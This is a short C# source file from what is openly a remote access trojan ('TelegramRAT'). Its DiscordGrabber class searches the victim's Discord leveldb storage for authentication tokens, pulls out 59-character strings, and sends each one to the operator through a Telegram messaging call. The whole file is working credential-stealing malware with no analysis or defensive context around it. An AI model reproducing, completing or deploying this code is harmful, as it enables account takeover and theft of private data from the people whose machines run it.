using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace TelegramRAT;

internal class DiscordGrabber
{
	public static void get()
	{
		List<string> list = SearchForFile();
		if (list.Count == 0)
		{
			telegram.sendText("⛔ Didn't find any ldb files");
			return;
		}
		foreach (string item in list)
		{
			foreach (Match item2 in Regex.Matches(item, "[^\"]*"))
			{
				if (item2.Length == 59)
				{
					telegram.sendText("\ud83d\udc8e Discord token: " + item2.ToString());
				}
			}
		}
	}

	private static List<string> SearchForFile()
	{
		List<string> list = new List<string>();
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
		if (!Directory.Exists(path))
		{
			telegram.sendText("\ud83d\udee0 Discord path not found");
			return list;
		}
		string[] files = Directory.GetFiles(path, "*.ldb", SearchOption.TopDirectoryOnly);
		for (int i = 0; i < files.Length; i++)
		{
			string text = File.ReadAllText(files[i]);
			if (text.Contains("oken"))
			{
				list.Add(text);
			}
		}
		return list;
	}
}
